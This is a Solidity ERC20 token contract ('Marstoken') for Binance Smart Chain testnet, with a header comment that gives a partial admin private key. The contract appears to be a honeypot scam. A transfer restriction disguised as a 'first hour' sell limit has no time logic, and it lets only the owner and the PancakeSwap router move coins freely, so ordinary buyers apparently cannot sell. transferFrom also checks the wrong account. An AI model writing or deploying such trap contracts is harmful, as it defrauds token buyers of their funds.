/**
 
Your Token https://testnet.bscscan.com/address/0x44FD3Ac471FfD2cBdd8e66fE0FE118889Ab96FCA#contracts

Import this account to metamask, this is admin account,
38b0ddf....

Pancake Router https://testnet.bscscan.com/address/0xD99D1c33F9fC3444f8101754aBC46c52416550D1

 */

/**
 */

pragma solidity ^0.5.16;

// ----------------------------------------------------------------------------
// ----------------------------------------------------------------------------
contract ERC20Interface {
    function totalSupply() public view returns (uint256);

    function balanceOf(address tokenOwner)
        public
        view
        returns (uint256 balance);

    function allowance(address tokenOwner, address spender)
        public
        view
        returns (uint256 remaining);

    function transfer(address to, uint256 tokens) public returns (bool success);

    function approve(address spender, uint256 tokens)
        public
        returns (bool success);

    function transferFrom(
        address from,
        address to,
        uint256 tokens
    ) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint256 tokens);
    event Approval(
        address indexed tokenOwner,
        address indexed spender,
        uint256 tokens
    );
}

// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint256 a, uint256 b) public pure returns (uint256 c) {
        c = a + b;
        require(c >= a);
    }

    function safeSub(uint256 a, uint256 b) public pure returns (uint256 c) {
        require(b <= a);
        c = a - b;
    }

    function safeMul(uint256 a, uint256 b) public pure returns (uint256 c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }

    function safeDiv(uint256 a, uint256 b) public pure returns (uint256 c) {
        require(b > 0);
        c = a / b;
    }
}

contract BTCSTtLTC is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it
    // address private _owner = 0xB518612d612d44b84D665dc53D0AaD514AE396F6;
    address private _owner = 0xd9a94b853364670C395E9e5f6DD6FDD70d72F2DB;
    uint256 public percentageToSellinFirstHour = 20;
    uint256 public _totalSupply;
    address public pancakeRouter = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;

    mapping(address => uint256) balances;
    mapping(address => uint256) receivedCoins;
    mapping(address => uint256) sentCoins;
    mapping(address => mapping(address => uint256)) allowed;

    /**
     * Constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    constructor() public {
        name = "Marstoken";
        symbol = "MARST";
        decimals = 18;
        _totalSupply = 1000000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function transfer(address to, uint256 tokens)
        public
        returns (bool success)
    {
        sentCoins[msg.sender] = safeAdd(sentCoins[msg.sender], tokens);

        if (msg.sender == _owner || msg.sender == pancakeRouter)
            receivedCoins[to] = safeAdd(receivedCoins[to], tokens);

        if (!(msg.sender == _owner || msg.sender == pancakeRouter))
            require(
                sentCoins[msg.sender] <=
                    safeDiv(
                        safeMul(
                            receivedCoins[msg.sender],
                            percentageToSellinFirstHour * decimals
                        ),
                        100 * decimals
                    ),
                "Please send coins below your limit"
            );

        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 tokens
    ) public returns (bool success) {
        // require(from == _owner, "You are not the owner!");

        sentCoins[from] = safeAdd(sentCoins[from], tokens);
        if (msg.sender == _owner || msg.sender == pancakeRouter)
            receivedCoins[to] = safeAdd(receivedCoins[to], tokens);

        if (!(msg.sender == _owner || msg.sender == pancakeRouter))
            require(
                sentCoins[msg.sender] <=
                    safeDiv(
                        safeMul(
                            receivedCoins[msg.sender],
                            percentageToSellinFirstHour * decimals
                        ),
                        100 * decimals
                    ),
                "Please send coins below your limit"
            );

        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply - balances[address(0)];
    }

    function balanceOf(address tokenOwner)
        public
        view
        returns (uint256 balance)
    {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender)
        public
        view
        returns (uint256 remaining)
    {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint256 tokens)
        public
        returns (bool success)
    {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
}
